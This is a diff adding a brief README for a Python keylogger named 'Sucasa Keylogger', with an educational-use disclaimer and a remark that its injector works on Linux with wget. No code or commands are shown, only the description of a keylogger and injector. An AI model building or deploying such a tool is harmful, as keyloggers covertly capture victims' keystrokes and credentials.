@@ -1,0 +1,4 @@
+# Sucasa Keylogger
+## These scripts are provided as-is with no guarantee of quality and only for use as educational tools. 
+------
+As of the moment the script will work about anywhere with python installed but the injector only works on linux distributions with wget
